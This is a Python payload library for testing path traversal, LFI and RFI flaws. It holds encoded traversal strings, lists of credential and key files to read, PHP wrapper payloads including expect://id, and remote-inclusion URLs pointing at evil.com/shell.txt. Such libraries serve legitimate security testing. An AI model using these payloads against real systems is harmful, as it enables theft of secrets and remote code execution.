"""
Directory Traversal and File Inclusion Payloads

Payloads for testing path traversal, local file inclusion (LFI),
and remote file inclusion (RFI) vulnerabilities.
"""

# Basic directory traversal
BASIC_TRAVERSAL = [
    "../",
    "..\\",
    "../../../",
    "..\\..\\..\\",
    "....//",
    "....\\\\",
    "..//..//..//",
    "..\\\\..\\\\..\\\\",
]

# URL encoded traversal
ENCODED_TRAVERSAL = [
    "%2e%2e%2f",  # ../
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",  # ..\
    "%2e%2e\\",
    "..%5c",
    "%252e%252e%252f",  # Double encoded
    "..%252f",
    "%c0%ae%c0%ae%c0%af",  # UTF-8 overlong encoding
    "%uff0e%uff0e%u2215",  # Unicode full-width
    "..%c0%af",
    "..%ef%bc%8f",
]

# Null byte injection (for bypassing extension checks)
NULL_BYTE_TRAVERSAL = [
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.png",
    "....//....//etc/passwd%00",
]

# Common sensitive files to check (Linux)
LINUX_SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/etc/motd",
    "/etc/mysql/my.cnf",
    "/etc/httpd/conf/httpd.conf",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/home/.bash_history",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/root/.ssh/authorized_keys",
]

# Common sensitive files to check (Windows)
WINDOWS_SENSITIVE_FILES = [
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\System32\\config\\SYSTEM",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\boot.ini",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\inetpub\\logs\\LogFiles",
    "C:\\xampp\\apache\\conf\\httpd.conf",
    "C:\\xampp\\php\\php.ini",
    "C:\\Windows\\debug\\NetSetup.log",
    "C:\\Windows\\Panther\\Unattend.xml",
]

# Web application config files
WEB_CONFIG_FILES = [
    ".htaccess",
    ".htpasswd",
    "web.config",
    "config.php",
    "config.inc.php",
    "configuration.php",
    "settings.php",
    "database.yml",
    "database.php",
    "db.php",
    ".env",
    ".env.local",
    ".env.production",
    "wp-config.php",
    "config/database.yml",
    "config/secrets.yml",
    "app/config/parameters.yml",
    "application.properties",
    "application.yml",
]

# PHP wrapper payloads for LFI
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.rot13/resource=",
    "php://input",
    "php://stdin",
    "php://memory",
    "php://temp",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # <?php phpinfo(); ?>
    "expect://id",
    "phar://",
    "zip://",
]

# Remote file inclusion test URLs
RFI_TEST_URLS = [
    "http://evil.com/shell.txt",
    "https://evil.com/shell.txt",
    "//evil.com/shell.txt",
    "\\\\evil.com\\shell.txt",
    "ftp://evil.com/shell.txt",
]

# Full traversal payloads with targets
def generate_traversal_payloads(target_file: str, depths: range = range(1, 10)) -> list:
    """Generate traversal payloads for a specific target file."""
    payloads = []
    for depth in depths:
        payloads.extend([
            "../" * depth + target_file,
            "..\\" * depth + target_file,
            "..../" * depth + target_file,
            "%2e%2e%2f" * depth + target_file,
            "%2e%2e/" * depth + target_file,
            "..%2f" * depth + target_file,
        ])
    return payloads


# Pre-generated common payloads
COMMON_LFI_PAYLOADS = (
    generate_traversal_payloads("etc/passwd") +
    generate_traversal_payloads("etc/hosts") +
    generate_traversal_payloads("Windows/win.ini") +
    generate_traversal_payloads("boot.ini")
)

# Signatures indicating successful file read
FILE_READ_SIGNATURES = {
    "/etc/passwd": ["root:", "nobody:", "/bin/bash", "/bin/sh", "daemon:"],
    "/etc/hosts": ["localhost", "127.0.0.1", "::1"],
    "win.ini": ["[extensions]", "[fonts]", "[files]"],
    "boot.ini": ["boot loader", "[operating systems]", "multi(0)"],
    ".htaccess": ["RewriteEngine", "RewriteRule", "AuthType", "Require"],
}
